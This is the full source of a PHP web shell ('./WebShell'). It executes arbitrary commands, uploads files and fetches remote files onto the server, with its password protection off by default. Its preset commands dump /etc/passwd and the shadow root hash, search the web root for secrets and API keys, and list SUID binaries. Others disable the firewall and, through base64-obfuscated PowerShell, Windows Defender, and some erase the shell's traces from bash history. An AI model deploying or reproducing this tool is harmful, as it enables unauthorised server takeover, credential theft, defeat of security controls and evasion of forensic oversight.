#<?php
session_start();
if (!isset($_SESSION['command_history'])) {
    $_SESSION['command_history'] = [];
}
define('passauth', False);
$autolog = False;
$passprompt = '';
$passhash = passauth ? '' : '';
function e($s) {
    echo htmlspecialchars($s, ENT_QUOTES);}
function h($s) {
    global $passprompt;
    if (function_exists('hash_hmac')) {
        return hash_hmac('sha3-512', $s, $passprompt);
    } else {
        return bin2hex(mhash(MHASH_SHA3_512, $s, $passprompt));}}
function fetch_fopen($host, $port, $src, $dst) {
    global $err, $ok;
    $ret = '';
    if (strpos($host, '://') === false) {
        $host = 'http://'. $host;
    } else {
        $host = str_replace(array('ssl://', 'tls://'), 'https://', $host);}
    $rh = fopen("${host}:${port}${src}", 'rb');
    if ($rh!== false) {
        $wh = fopen($dst, 'wb');
        if ($wh!== false) {
            $cbytes = 0;
            while (!feof($rh)) {
                $cbytes += fwrite($wh, fread($rh, 1024));}
            fclose($wh);
            $ret.= "${ok} Fetched file <i>${dst}</i> (${cbytes} bytes)<br />";
        } else {
            $ret.= "${err} Failed to open file <i>${dst}</i><br />";}
        fclose($rh);
    } else {
        $ret.= "${err} Failed to open URL <i>${host}:${port}${src}</i><br />";}
    return $ret;}
function fetch_sock($host, $port, $src, $dst) {
    global $err, $ok;
    $ret = '';
    $host = str_replace('https://', 'tls://', $host);
    $s = fsockopen($host, $port);
    if ($s) {
        $f = fopen($dst, 'wb');
        if ($f) {
            $buf = '';
            $r = array($s);
            $w = NULL;
            $e = NULL;
            fwrite($s, "GET ${src} HTTP/1.0\r\n\r\n");
            while (stream_select($r, $w, $e, 5) &&!feof($s)) {
                $buf.= fread($s, 1024);}
            $buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
            fwrite($f, $buf);
            fclose($f);
            $ret.= "${ok} Fetched file <i>${dst}</i> (". strlen($buf). " bytes)<br />";
        } else {
            $ret.= "${err} Failed to open file <i>${dst}</i><br />";}
        fclose($s);
    } else {
        $ret.= "${err} Failed to connect to <i>${host}:${port}</i><br />";}
    return $ret;}
ini_set('log_errors', '0');
ini_set('display_errors', '1');
error_reporting(E_ALL);
while (@ob_end_clean());
if (!isset($_SERVER)) {
    global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
    $_FILES =& $HTTP_POST_FILES;
    $_POST =& $HTTP_POST_VARS;
    $_SERVER =& $HTTP_SERVER_VARS;}
$auth = '';
$cmd = empty($_POST['cmd'])? '' : $_POST['cmd'];
$cwd = empty($_POST['cwd'])? getcwd() : $_POST['cwd'];
$fetch_func = 'fetch_fopen';
$fetch_host = empty($_POST['fetch_host'])? $_SERVER['REMOTE_ADDR'] : $_POST['fetch_host'];
$fetch_path = empty($_POST['fetch_path'])? '' : $_POST['fetch_path'];
$fetch_port = empty($_POST['fetch_port'])? '80' : $_POST['fetch_port'];
$pass = empty($_POST['pass'])? '' : $_POST['pass'];
$url = $_SERVER['REQUEST_URI'];
$status = '$ '. $cmd . "\n";
$ok = 'OK: ';
$warn = 'WARNING: ';
$err = 'ERROR: ';
if (!passauth && $autolog) {
  $autolog = false;}
if (!$autolog) {
} else {?>
  <script>
    setTimeout(function() {
      alert('Automatically logging out in 1 minute');
    }, 840000);
    setTimeout(function() {
      window.location.href = 'shell.php';
      alert('Logging out for security');
    }, 900000);
  </script><?php
}
if (passauth && !empty($passhash)) {
    if (function_exists('hash_hmac') || function_exists('mhash')) {
        $auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
        if (h($auth) !== $passhash) {
          ?><head><title>./WebShell</title></head><style>
                input[type="text"], input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin: 5px;
                    border: 1px solid #ccc;}
                input[type="submit"] {
                    background-color: #4CAF50;
                    color: #fff;
                    padding: 10px 20px;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;}
                input[type="submit"]:hover {
                    background-color: #3e8e41;}</style>
            <form action="<?php e($url); ?>" method="post">
                <h3><?php e($passprompt); ?></h3>
                <input name="pass" size="30" type="password"> 
                <input value="  Login  " type="submit"></form>
            <?php exit;
        }
    } else {
        $status .= "${warn} Password disabled.<br />";
    }
}
if (!ini_get('allow_url_fopen')) {
    ini_set('allow_url_fopen', '1');
    if (!ini_get('allow_url_fopen')) {
        if (function_exists('stream_select')) {
            $fetch_func = 'fetch_sock';
        } else {
            $fetch_func = '';
            $status .= "${warn} File fetching disabled ('allow_url_fopen' disabled and 'stream_select()' missing).<br />";
        }
    }
}
if (!ini_get('file_uploads')) {
    ini_set('file_uploads', '1');
    if (!ini_get('file_uploads')) {
        $status .= "${warn} File uploads disabled.<br />";
    }
}
if (ini_get('open_basedir') && !ini_set('open_basedir', '')) {
    $status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
}
if (!chdir($cwd)) {
    $cwd = getcwd();
}
if (!empty($fetch_func) && !empty($fetch_path)) {
    $dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
    $status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);
}
if (ini_get('file_uploads') && !empty($_FILES['upload'])) {
    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        $status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
    }
}
?>
<form action="<?php e($url); ?>" method="post" enctype="multipart/form-data"<?php if (ini_get('file_uploads')) : ?><?php endif; ?>>
<head><title>./WebShell</title></head><h2>./WebShell</h2>
<?php if (!passauth): ?>
  <p style="color: red;">WARNING! Password disabled. Anyone can execute commands.</p>
<?php else: ?>
  <p style="color: green;">Password protected.</p>
<?php endif; ?>
<p>Auto-logout is <span style="color: <?= $autolog ? 'green' : 'red'; ?>"><?= $autolog ? 'enabled' . ' every 15 minutes' : 'disabled'; ?></span></p>
    <?php if (!empty($passhash)): ?>
        <input name="auth" type="hidden" value="<?php e($auth); ?>">
    <?php endif; ?>
    <table border="0">
        <?php if (!empty($fetch_func)): ?>
            <tr><td><b>Fetch:</b></td>
                <td>host: <input name="fetch_host" id="fetch_host" size="15" value="<?php e($fetch_host); ?>"> 
                    port: <input name="fetch_port" id="fetch_port" size="4" value="<?php e($fetch_port); ?>"> 
                    path: <input name="fetch_path" id="fetch_path" size="40" value=""></td></tr>
        <?php endif; ?>
    <tr><td><b>CWD:</b></td>
      <td><input name="cwd" id="cwd" size="50" value="<?php e($cwd); ?>">
        <?php if (ini_get('file_uploads')): ?>
          <b>Upload:</b> <input name="upload" id="upload" type="file">
        <?php endif; ?>
      </td>
    </tr>
    <tr>
      <td><b>Command:</b></td>
      <td>
        <input name="cmd" id="cmd" size="55" value="<?php e($cmd); ?>">
        <select id="auto_cmds" onchange="fillCmd(this.value)">
          <option value="">Auto commands</option>
          <?php if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'): ?>
            <optgroup label="Windows">
              <option value="echo User Info: & whoami & echo User Info Detailed: & whoami /all & echo Session Info: & qwinsta & echo Net User Info: & net user">Show all groups/users</option>
              <option value="echo IPv4 Configuration: & netsh interface ipv4 show config & echo WLAN Profiles: & netsh wlan show profiles">Show network information</option>
              <option value="systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot; /C:&quot;Total Physical Memory&quot; & wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors /format:list">Show Hardware/OS Info</option>
              <option value="tasklist">Show running processes</option>
              <option value="driverquery | findstr Kernel">Show kernel drivers</option>
              <option value="set">Show environment vars</option>
              <option value="curl checkip.amazonaws.com & echo.">Get public IP address</option>
              <option value="wmic product get name,version">List installed software</option>
              <option value="dir /s /b *.ini *.txt *.log *.conf *.config 2>NUL | findstr /i /g:conffiles.txt">Find common config/log files (requires conffiles.txt with keywords)</option>
              <option value="findstr /s /i &quot;password&quot; *.txt *.ini *.log *.config 2>NUL">Search for "password" in common files</option>
              <option value="powershell -ExecutionPolicy Bypass -Command Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZjtzYyBzdG9wIFdpbkRlZmVuZA==')))">[ADMIN] (b64) Disable Firewall+Defender</option>
              <option value="powershell -ExecutionPolicy Bypass -Command Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9uO3NjIHN0YXJ0IFdpbkRlZmVuZA==')))">[ADMIN] (b64) Restore Firewall+Defender</option>
              <option value="netstat -ano | findstr LISTENING">List listening ports (with PID)</option>
              <option value="whoami /priv">Show current user privileges</option>
              <option value="reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run">List startup programs from registry</option>
              <option value="schtasks /query /fo LIST /v">List scheduled tasks</option>
              <option value="erase_history_windows">Erase WebShell History (Windows)</option>
            </optgroup>
          <?php else: ?>
            <optgroup label="Linux">
              <option value="echo 'Whoami:'; whoami; echo '\nUsers Logged On:'; w; echo '\nUser ID:'; id; echo '\n/etc/passwd Contents:'; cat /etc/passwd">Show all groups/users</option>
              <option value="echo 'Network Connections:'; nmcli con show 2>/dev/null || ip addr; echo '\nInterfaces:'; ifconfig 2>/dev/null || ip -s link; echo '\nWireless Interfaces:'; iwconfig 2>/dev/null || echo ' (iwconfig not found)'">Show network information</option>
              <option value="echo 'CPU Info:'; lscpu; echo '\nMemory Info:'; free -h; echo '\nKernel Version:'; uname -a; echo '\nDisk Usage:'; df -h">Show Hardware/OS Info</option>
              <option value="(ps aux --sort=-%cpu | head -n 15; echo; ps aux --sort=-%mem | head -n 15) | sort -rnk 3,4 | uniq -f 10 | head -n 25">Show most active processes</option>
              <option value="echo 'Kernel boot commands:'; cat /proc/cmdline; echo '\nKernel modules:'; lsmod; echo '\nSysctl Kernel Info:'; sysctl -a | grep kernel">Show kernel information</option>
              <option value="printenv">Show environment vars</option>
              <option value="curl -s checkip.amazonaws.com; echo">Get public IP address</option>
              <option value="lsof -nPi">Show open ports/processes</option>
              <option value="cat /etc/crontab; crontab -l 2>/dev/null">List cron jobs</option>
              <option value="find / -name &quot;*.conf&quot; -o -name &quot;*.config&quot; -o -name &quot;*.log&quot; -o -name &quot;*.bak&quot; 2>/dev/null | head -n 50">Find common config/backup/log files</option>
              <option value="grep -r -i &quot;secret\|api_key&quot; /var/www/html 2>/dev/null | head -n 100">Search for strings in web root</option>
              <option value="sudo -l 2>/dev/null">List user's sudo privileges</option>
              <option value="sudo cat /etc/sudoers 2>/dev/null">[SUDO] View sudoers</option>
              <option value="sudo iptables -L > iptables.backup.txt; sudo iptables -F; echo 'Firewall potentially disabled. Backup in iptables.backup.txt'">[SUDO] Disable firewall</option>
              <option value="sudo iptables-restore < iptables.backup.txt; echo 'Firewall potentially restored from iptables.backup.txt'">[SUDO] Restore firewall</option>
              <option value="sudo grep &quot;^root:&quot; sudo /etc/shadow 2>/dev/null">[SUDO] Check root hash</option>
              <option value="find / -perm /4000 2>/dev/null | head -n 100">Find SUID/SGID bins</option>
              <option value="ls -laR /var/www/html 2>/dev/null | head -n 100">List web root contents recursively</option>
              <option value="journalctl -xe --no-pager | tail -n 100">View recent systemd journal logs</option>
              <option value="erase_history_linux">Erase WebShell History (Linux)</option>
            </optgroup>
          <?php endif; ?>
        </select>
      </td>
    </tr>
    <tr>
      <td colspan="2">
        <input type="submit" value="  Execute  ">
      </td>
    </tr>
  </table>
</form>
<script>
  function fillCmd(cmd) {
    document.getElementById('cmd').value = cmd;
  }
</script>
<pre>
<?php
if (!empty($status)) {
    e($status);
}
if (!empty($cmd)) {
    $cmd = trim($cmd);
    if (empty($cmd)) {
        $status .= "${warn} Empty command.<br />";
    } else {
        $res = array();
        $descriptorspec = array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w'),
        );
        $process = proc_open($cmd, $descriptorspec, $pipes, $cwd);
        if (is_resource($process)) {
            fwrite($pipes[0], '<?php die(); ?>' . PHP_EOL);
            fclose($pipes[0]);
            $res['stdout'] = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $res['stderr'] = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            proc_close($process);
            if ($res['stdout']) {
                $res['stdout'] = htmlspecialchars($res['stdout'], ENT_QUOTES);
            }
            if ($res['stderr']) {
                $res['stderr'] = htmlspecialchars($res['stderr'], ENT_QUOTES);
            }
            if (!empty($res['stdout'])) {
                e($res['stdout']);
            }
            if (!empty($res['stderr'])) {
                e($res['stderr']);
            }
        } else {
            $status .= "${err} Failed to execute command.<br />";
        }
    }
}

if (isset($_POST['erase_history_linux'])) {
    $bash_history_file = getenv('HOME') . '/.bash_history';
    if (file_exists($bash_history_file)) {
        $history = file($bash_history_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $new_history = array_filter($history, function($line) {
            return !in_array($line, $_SESSION['command_history']);
        });
        file_put_contents($bash_history_file, implode("\n", $new_history) . "\n");
        $_SESSION['command_history'] = [];
        $status .= 'WebShell history erased from bash history.';
    } else {
        $status .= 'Bash history file not found.';
    }
} elseif (isset($_POST['erase_history_windows'])) {
    $clear_cmd = 'doskey /reinstall';
    $process = proc_open($clear_cmd, $descriptorspec, $pipes, $cwd);
    if (is_resource($process)) {
        proc_close($process);
        $_SESSION['command_history'] = [];
        $status .= 'WebShell history erased from current command session.';
    } else {
        $status .= 'Failed to clear command history.';
    }
}
?>
</pre>
